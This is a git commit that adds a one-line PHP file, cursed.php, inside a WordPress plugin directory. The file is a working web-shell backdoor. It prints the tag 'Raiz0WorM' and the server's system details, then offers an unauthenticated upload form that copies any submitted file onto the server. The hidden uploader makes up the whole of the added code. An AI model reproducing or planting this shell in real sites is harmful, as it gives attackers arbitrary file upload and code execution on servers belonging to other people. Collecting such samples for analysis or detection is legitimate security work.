cb08ba20fc8432d8087f2879af10ce93f694a99b
Stefan Pejcic <pejcha1994@gmail.com>
2021-01-12 11:27:11 +0100

    Create cursed.php

---
+++ 12.01.2021/wp-content/plugins/apikey/cursed.php
@@ -0,0 +1,1 @@
+<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>
